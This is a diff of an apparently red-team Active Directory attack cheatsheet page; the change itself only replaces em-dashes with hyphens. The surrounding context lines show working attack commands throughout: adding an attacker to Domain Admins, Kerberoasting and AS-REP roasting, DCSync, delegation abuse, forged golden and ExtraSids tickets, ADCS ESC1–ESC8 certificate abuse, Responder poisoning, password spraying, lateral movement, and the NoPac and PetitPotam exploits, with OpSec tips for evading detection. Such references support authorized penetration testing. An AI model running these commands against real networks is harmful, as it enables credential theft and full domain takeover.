@@ -1,6 +1,6 @@
 ---
 title: "Active Directory Enumeration & Attacks Cheatsheet"
-excerpt: "A comprehensive reference for AD enumeration and attack paths — covering external/internal recon, password spraying, network poisoning, credentialed enumeration, ACL abuse, Kerberos attacks, delegation abuse, lateral movement, domain dominance, GPO exploitation, ADCS misconfigurations, cross-forest trust abuse, and advanced exploits. Designed for Red Team engagements."
+excerpt: "A comprehensive reference for AD enumeration and attack paths - covering external/internal recon, password spraying, network poisoning, credentialed enumeration, ACL abuse, Kerberos attacks, delegation abuse, lateral movement, domain dominance, GPO exploitation, ADCS misconfigurations, cross-forest trust abuse, and advanced exploits. Designed for Red Team engagements."
 url: "https://asbawy.com/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet"
 date: "2026-06-15"
 updated: "2026-07-20"
@@ -30,7 +30,7 @@ Misconfigured permissions on AD objects (users, groups, computers, OUs) are the 
 
 ## 1.1 GenericAll
 
-**Full control** over the target object — reset passwords, change SPNs, modify group membership, set RBCD. The most dangerous ACL misconfiguration.
+**Full control** over the target object - reset passwords, change SPNs, modify group membership, set RBCD. The most dangerous ACL misconfiguration.
 
 ### Enumeration
 
@@ -64,7 +64,7 @@ RETURN p
 ### Exploitation
 
 <Tabs>
-<Tab label="Windows — Password Reset">
+<Tab label="Windows - Password Reset">
 
 ```powershell
 Set-DomainUserPassword -Identity "target_user" -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Verbose
@@ -74,7 +74,7 @@ net user target_user P@ssw0rd123! /domain
 ```
 
 </Tab>
-<Tab label="Windows — Add to Group">
+<Tab label="Windows - Add to Group">
 
 ```powershell
 Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker_user" -Verbose
@@ -84,7 +84,7 @@ net group "Domain Admins" attacker_user /add /domain
 ```
 
 </Tab>
-<Tab label="Windows — RBCD on Computer">
+<Tab label="Windows - RBCD on Computer">
 
 ```powershell
 # Create machine account
@@ -124,7 +124,7 @@ impacket-psexec domain.local/administrator@TARGET.domain.local -k -no-pass
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Password reset generates Event 4724, group changes generate 4728/4732 — both log your
+  **OpSec:** Password reset generates Event 4724, group changes generate 4728/4732 - both log your
   SID.
 </Callout>
 
@@ -132,7 +132,7 @@ impacket-psexec domain.local/administrator@TARGET.domain.local -k -no-pass
 
 ## 1.2 GenericWrite
 
-**Write to any non-protected attribute** — set SPNs for Kerberoasting, change logon scripts, add group members, or configure RBCD on computers. Cannot modify the DACL itself (unlike GenericAll).
+**Write to any non-protected attribute** - set SPNs for Kerberoasting, change logon scripts, add group members, or configure RBCD on computers. Cannot modify the DACL itself (unlike GenericAll).
 
 ### Enumeration
 
@@ -163,7 +163,7 @@ RETURN p
 ### Exploitation
 
 <Tabs>
-<Tab label="Windows — SPN Hijack + Kerberoast">
+<Tab label="Windows - SPN Hijack + Kerberoast">
 
 ```powershell
 # Set SPN on target user
@@ -198,7 +198,7 @@ bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' clear obj
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** SPN changes generate Event 5136. Overwriting a real SPN breaks the legitimate service —
+  **OpSec:** SPN changes generate Event 5136. Overwriting a real SPN breaks the legitimate service -
   always clean up.
 </Callout>
 
@@ -206,7 +206,7 @@ bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' clear obj
 
 ## 1.3 WriteDacl
 
-**Modify the DACL** of the target object — grant yourself any permission, including GenericAll or DCSync rights. WriteDacl on the domain object = game over.
+**Modify the DACL** of the target object - grant yourself any permission, including GenericAll or DCSync rights. WriteDacl on the domain object = game over.
 
 ### Enumeration
 
@@ -264,7 +264,7 @@ secretsdump.py domain.local/attacker:'Password123!'@10.0.0.1 -just-dc-user admin
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Modifying the domain DACL is extremely noisy — generates Event 5136 on the domain root.
+  **OpSec:** Modifying the domain DACL is extremely noisy - generates Event 5136 on the domain root.
   MDI detects this instantly.
 </Callout>
 
@@ -323,7 +323,7 @@ bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add group
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Owner change generates Event 5136. The original owner loses implicit rights — may
+  **OpSec:** Owner change generates Event 5136. The original owner loses implicit rights - may
   trigger identity governance alerts.
 </Callout>
 
@@ -331,7 +331,7 @@ bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add group
 
 ## 1.5 Self (AddSelf)
 
-**Add yourself to a group** directly — single-step escalation. If this is on a privileged group (Domain Admins, Server Operators), it's instant privilege escalation.
+**Add yourself to a group** directly - single-step escalation. If this is on a privileged group (Domain Admins, Server Operators), it's instant privilege escalation.
 
 ### Enumeration
 
@@ -385,7 +385,7 @@ netexec ldap 10.0.0.1 -u attacker -p 'Password123!' --group "Target Group"
 
 ## 1.6 AllExtendedRights
 
-**All extended rights** on the target — includes **ForceChangePassword** (reset password without knowing the current one). On user objects, this = instant account takeover.
+**All extended rights** on the target - includes **ForceChangePassword** (reset password without knowing the current one). On user objects, this = instant account takeover.
 
 ### Enumeration
 
@@ -436,11 +436,11 @@ bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' set passw
 
 # 2. Kerberos Attacks
 
-These require **no special privileges** — any domain user can perform them. Crack the tickets offline at your leisure.
+These require **no special privileges** - any domain user can perform them. Crack the tickets offline at your leisure.
 
 ## 2.1 AS-REP Roasting
 
-Targets accounts with **"Do not require Kerberos preauthentication"** enabled. The DC sends back an encrypted TGT without verifying the password first — crack it offline.
+Targets accounts with **"Do not require Kerberos preauthentication"** enabled. The DC sends back an encrypted TGT without verifying the password first - crack it offline.
 
 ### Enumeration
 
@@ -493,7 +493,7 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Generates Event 4768 on the DC. Unauthenticated request — hard to attribute without
+  **OpSec:** Generates Event 4768 on the DC. Unauthenticated request - hard to attribute without
   packet capture.
 </Callout>
 
@@ -501,7 +501,7 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 
 ## 2.2 Kerberoasting
 
-Any domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's NTLM hash — crack it offline. Target accounts with **SPNs registered**.
+Any domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's NTLM hash - crack it offline. Target accounts with **SPNs registered**.
 
 ### Enumeration
 
@@ -562,7 +562,7 @@ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Generates Event 4769 per SPN. Rapid sequential requests are a detection signature —
+  **OpSec:** Generates Event 4769 per SPN. Rapid sequential requests are a detection signature -
   target only high-value SPNs.
 </Callout>
 
@@ -640,7 +640,7 @@ impacket-psexec domain.local/administrator@DC01.domain.local -k -no-pass
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Forced authentication (PetitPotam/PrinterBug) is the noisiest step — consider passive
+  **OpSec:** Forced authentication (PetitPotam/PrinterBug) is the noisiest step - consider passive
   TGT monitoring instead.
 </Callout>
 
@@ -677,7 +677,7 @@ RETURN c.name, c.allowedtodelegateto
 <Tab label="Windows">
 
 ```powershell
-# S4U2Self + S4U2Proxy — impersonate admin to the delegated SPN
+# S4U2Self + S4U2Proxy - impersonate admin to the delegated SPN
 Rubeus.exe s4u /user:APP01$ /rc4:<MACHINE_ACCOUNT_NTLM> /impersonateuser:administrator /msdsspn:cifs/DC01.domain.local /domain:domain.local /dc:DC01.domain.local /ptt
 
 # Access the target
@@ -700,7 +700,7 @@ impacket-psexec domain.local/administrator@DC01.domain.local -k -no-pass
 
 <Callout type="warning">
   **OpSec:** S4U2Self/S4U2Proxy generate Event 4769 with the impersonated user's name and target SPN
-  — fully visible to defenders.
+  - fully visible to defenders.
 </Callout>
 
 ---
@@ -778,7 +778,7 @@ impacket-psexec domain.local/administrator@TARGET.domain.local -k -no-pass
 
 <Callout type="warning">
   **OpSec:** New machine account (Event 4741) + immediate RBCD attribute change (Event 5136) + S4U
-  requests (Event 4769) — strong detection signature.
+  requests (Event 4769) - strong detection signature.
 </Callout>
 
 ---
@@ -895,7 +895,7 @@ impacket-psexec domain.local/administrator@DC01.domain.local -k -no-pass
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Nearly impossible to detect — the TGT is cryptographically valid. Defenders look for:
+  **OpSec:** Nearly impossible to detect - the TGT is cryptographically valid. Defenders look for:
   abnormal ticket lifetimes, PAC inconsistencies, and Credential Guard.
 </Callout>
 
@@ -937,7 +937,7 @@ impacket-smbexec domain.local/administrator@TARGET.domain.local -k -no-pass
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** Nearly undetectable — TGS is validated only by the target service, not the KDC. Enable
+  **OpSec:** Nearly undetectable - TGS is validated only by the target service, not the KDC. Enable
   `ValidateKdcPacSignature` registry key on critical servers to defend.
 </Callout>
 
@@ -945,7 +945,7 @@ impacket-smbexec domain.local/administrator@TARGET.domain.local -k -no-pass
 
 # 5. GPO Abuse
 
-If you can **write to a GPO** (GenericAll/GenericWrite on the GPO object), you can push malicious config to every machine in the GPO's scope — local admin, scheduled tasks, logon scripts, software deployment.
+If you can **write to a GPO** (GenericAll/GenericWrite on the GPO object), you can push malicious config to every machine in the GPO's scope - local admin, scheduled tasks, logon scripts, software deployment.
 
 ### Enumeration
 
@@ -982,7 +982,7 @@ RETURN g.name
 ### Exploitation
 
 <Tabs>
-<Tab label="Windows — SharpGPOAbuse">
+<Tab label="Windows - SharpGPOAbuse">
 
 ```powershell
 # Add local admin via GPO
@@ -1020,11 +1020,11 @@ netexec ldap 10.0.0.1 -u attacker -p 'Password123!' --gpo-modifiable
 
 ---
 
-# 6. ADCS — ESC1 through ESC8
+# 6. ADCS - ESC1 through ESC8
 
-AD Certificate Services misconfigurations let you **request certificates as any user** — turning a cert into a password equivalent. ESC1 is the most common and impactful.
+AD Certificate Services misconfigurations let you **request certificates as any user** - turning a cert into a password equivalent. ESC1 is the most common and impactful.
 
-## ESC1 — Template Substitution (Most Common)
+## ESC1 - Template Substitution (Most Common)
 
 A template is vulnerable if it has: **Client Authentication EKU** + **ENROLLEE_SUPPLIES_SUBJECT** enabled + no manager approval + you have enrollment rights. Request a cert as `administrator@domain.local`.
 
@@ -1065,11 +1065,11 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.0.1
 </Tab>
 </Tabs>
 
-## ESC2 — Any Purpose EKU
+## ESC2 - Any Purpose EKU
 
-Same as ESC1, but the template has **no EKU** or **Any Purpose EKU** (`2.5.29.37.0`) — the cert can be used for anything. Same exploitation as ESC1.
+Same as ESC1, but the template has **no EKU** or **Any Purpose EKU** (`2.5.29.37.0`) - the cert can be used for anything. Same exploitation as ESC1.
 
-## ESC3 — Enrollment Agent
+## ESC3 - Enrollment Agent
 
 Two-step attack: request an **Enrollment Agent certificate** → use it to request a cert **on behalf of** another user.
 
@@ -1092,7 +1092,7 @@ certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template '
 </Tab>
 </Tabs>
 
-## ESC4 — Writable Certificate Template
+## ESC4 - Writable Certificate Template
 
 You have **write permissions on a template object** → modify it to become ESC1-vulnerable → exploit as ESC1.
 
@@ -1121,13 +1121,13 @@ certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template '
 </Tab>
 </Tabs>
 
-## ESC5 — PKI Enrollment Misconfiguration
+## ESC5 - PKI Enrollment Misconfiguration
 
-Misconfigured enrollment endpoints or PKI infrastructure permissions. Broad category — check CA security descriptors and web enrollment service configs.
+Misconfigured enrollment endpoints or PKI infrastructure permissions. Broad category - check CA security descriptors and web enrollment service configs.
 
-## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
 
-**CA-level flag** that lets you supply arbitrary SANs on **any template** — makes every Client Auth template ESC1-equivalent.
+**CA-level flag** that lets you supply arbitrary SANs on **any template** - makes every Client Auth template ESC1-equivalent.
 
 <Tabs>
 <Tab label="Check (Windows)">
@@ -1155,7 +1155,7 @@ certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template '
 </Tab>
 </Tabs>
 
-## ESC7 — Vulnerable Certificate Authority
+## ESC7 - Vulnerable Certificate Authority
 
 You have **ManageCA** or **ManageCertificates** permissions on the CA itself → enable ESC6 flag, approve pending requests, or issue certs directly.
 
@@ -1183,7 +1183,7 @@ certipy-ad ca -u attacker@domain.local -p 'Password123!' -ca 'CA01' -dc-ip 10.0.
 </Tab>
 </Tabs>
 
-## ESC8 — NTLM Relay to AD CS
+## ESC8 - NTLM Relay to AD CS
 
 **Relay NTLM auth** to the CA's HTTP enrollment endpoint → get a certificate as the relayed user. Chain with PetitPotam/PrinterBug for domain compromise.
 
@@ -1317,7 +1317,7 @@ linkedin2username
 
 # 8. Internal Network Recon & Unauthenticated Enumeration
 
-First steps after landing on the internal network — no credentials required.
+First steps after landing on the internal network - no credentials required.
 
 ## 8.1 Host Discovery & Packet Sniffing
 
@@ -1417,14 +1417,14 @@ for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $
 ## 9.2 Execution
 
 <Tabs>
-<Tab label="Linux — RPCClient">
+<Tab label="Linux - RPCClient">
 
 ```bash
 for u in $(cat valid_users.txt); do rpcclient -U "$u%Password123!" -c "getusername;quit" <DC_IP> | grep Authority; done
 ```
 
 </Tab>
-<Tab label="Linux — Kerbrute">
+<Tab label="Linux - Kerbrute">
 
 ```bash
 # Avoids Event ID 4625, but watch lockout threshold
@@ -1432,7 +1432,7 @@ kerbrute passwordspray -d domain.local --dc <DC_IP> valid_users.txt Password123!
 ```
 
 </Tab>
-<Tab label="Linux — CrackMapExec">
+<Tab label="Linux - CrackMapExec">
 
 ```bash
 sudo crackmapexec smb <DC_IP> -u valid_users.txt -p Password123! | grep +
@@ -1473,7 +1473,7 @@ Poison name resolution broadcasts to capture NTLMv2 hashes from users authentica
 <Tab label="Passive Analysis">
 
 ```bash
-# Listen only — no poisoning
+# Listen only - no poisoning
 sudo responder -I eth0 -A
 ```
 
@@ -1527,7 +1527,7 @@ hashcat -m 5600 hash.txt wordlist.txt
 
 # 11. Credentialed Enumeration
 
-With valid domain credentials — enumerate users, groups, shares, sessions, and graph the full attack surface.
+With valid domain credentials - enumerate users, groups, shares, sessions, and graph the full attack surface.
 
 ## 11.1 CrackMapExec (CME)
 
@@ -1636,7 +1636,7 @@ Get-DomainGPO | select displayname
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** BloodHound/SharpHound generates thousands of LDAP queries — detectable by MDI and SIEM.
+  **OpSec:** BloodHound/SharpHound generates thousands of LDAP queries - detectable by MDI and SIEM.
   Use targeted collection (`-c Session,ACL`) instead of `-c All` when stealth matters.
 </Callout>
 
@@ -1649,10 +1649,10 @@ Moving between hosts after obtaining credentials or hashes.
 ## 12.1 Remote Connections
 
 <Tabs>
-<Tab label="Linux — Impacket">
+<Tab label="Linux - Impacket">
 
 ```bash
-# PSExec (SYSTEM shell, noisy — writes a service binary)
+# PSExec (SYSTEM shell, noisy - writes a service binary)
 psexec.py <domain>/<user>:<pass>@<Target_IP>
 
 # WMIExec (Semi-interactive, stealthier, runs as user)
@@ -1663,7 +1663,7 @@ smbexec.py <domain>/<user>:<pass>@<Target_IP>
 ```
 
 </Tab>
-<Tab label="Linux — Evil-WinRM">
+<Tab label="Linux - Evil-WinRM">
 
 ```bash
 evil-winrm -i <Target_IP> -u <user> -p <pass>
@@ -1671,7 +1671,7 @@ evil-winrm -i <Target_IP> -u <user> -H <NT_HASH>  # Pass-the-Hash
 ```
 
 </Tab>
-<Tab label="Windows — WinRM">
+<Tab label="Windows - WinRM">
 
 ```powershell
 Enter-PSSession -ComputerName <Target_IP> -Credential <domain>\<user>
@@ -1740,7 +1740,7 @@ sc query windefend
 ## 13.3 WinRM "Double Hop" Workarounds
 
 <Tabs>
-<Tab label="Method 1 — PSCredential">
+<Tab label="Method 1 - PSCredential">
 
 ```powershell
 $SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
@@ -1749,7 +1749,7 @@ Get-DomainUser -spn -Credential $Cred
 ```
 
 </Tab>
-<Tab label="Method 2 — PSSession Config">
+<Tab label="Method 2 - PSSession Config">
 
 ```powershell
 Register-PSSessionConfiguration -Name sessionname -RunAsCredential domain\user
@@ -1774,7 +1774,7 @@ Enumerating and abusing trust relationships between domains and forests.
 ## 14.1 Trust Enumeration
 
 <Tabs>
-<Tab label="Windows — PowerView">
+<Tab label="Windows - PowerView">
 
 ```powershell
 Get-DomainTrust
@@ -1783,7 +1783,7 @@ Get-DomainForeignGroupMember -Domain <Trusted_Domain>
 ```
 
 </Tab>
-<Tab label="Windows — Netdom">
+<Tab label="Windows - Netdom">
 
 ```powershell
 netdom query /domain:domain.local trust
@@ -1818,7 +1818,7 @@ raiseChild.py -target-exec <Parent_DC_IP> <child_domain>/<admin>
 ```
 
 </Tab>
-<Tab label="Windows — Mimikatz">
+<Tab label="Windows - Mimikatz">
 
 ```powershell
 kerberos::golden /user:fakeuser /domain:<child_domain> /sid:<Child_SID> /krbtgt:<Child_KRBTGT_Hash> /sids:<Parent_EnterpriseAdmins_SID> /ptt
@@ -1828,7 +1828,7 @@ kerberos::golden /user:fakeuser /domain:<child_domain> /sid:<Child_SID> /krbtgt:
 </Tabs>
 
 <Callout type="warning">
-  **OpSec:** ExtraSids tickets contain SID history from another domain — MDI detects this as
+  **OpSec:** ExtraSids tickets contain SID history from another domain - MDI detects this as
   "Suspicious SID-History addition." The forged ticket also generates abnormal Event 4769 with
   cross-domain SIDs.
 </Callout>
@@ -1867,14 +1867,14 @@ cat \\<DC_IP>\SYSVOL\<domain>\scripts\*.vbs
 
 <Callout type="warning">
   **OpSec:** Accessing SYSVOL is normal domain behavior and generates minimal logging. The GPP
-  passwords may be stale — always verify credentials before using them.
+  passwords may be stale - always verify credentials before using them.
 </Callout>
 
 ---
 
 # 16. Advanced Exploits
 
-## 16.1 NoPac — SamAccountName Spoofing (CVE-2021-42278 / CVE-2021-42287)
+## 16.1 NoPac - SamAccountName Spoofing (CVE-2021-42278 / CVE-2021-42287)
 
 Exploits the lack of validation when renaming a computer account to match a Domain Controller's sAMAccountName. Combined with Kerberos PAC confusion to impersonate a DC.
 
@@ -1896,7 +1896,7 @@ sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_NAME> -
 </Tab>
 </Tabs>
 
-## 16.2 PetitPotam — NTLM Relay to ADCS (CVE-2021-36942)
+## 16.2 PetitPotam - NTLM Relay to ADCS (CVE-2021-36942)
 
 Force a DC to authenticate to your relay, then relay to the ADCS web enrollment endpoint to obtain a certificate as the DC machine account.
 
@@ -1923,6 +1923,6 @@ secretsdump.py -just-dc-user <domain>/administrator -k -no-pass "<DC_NAME>$"@<DC
 
 <Callout type="warning">
   **OpSec:** PetitPotam triggers NTLM authentication from the DC (Event 4624 Type 3). The relay
-  generates Event 4886/4887 on the CA. Patched in KB5005413 — but many environments remain
+  generates Event 4886/4887 on the CA. Patched in KB5005413 - but many environments remain
   vulnerable.
 </Callout>
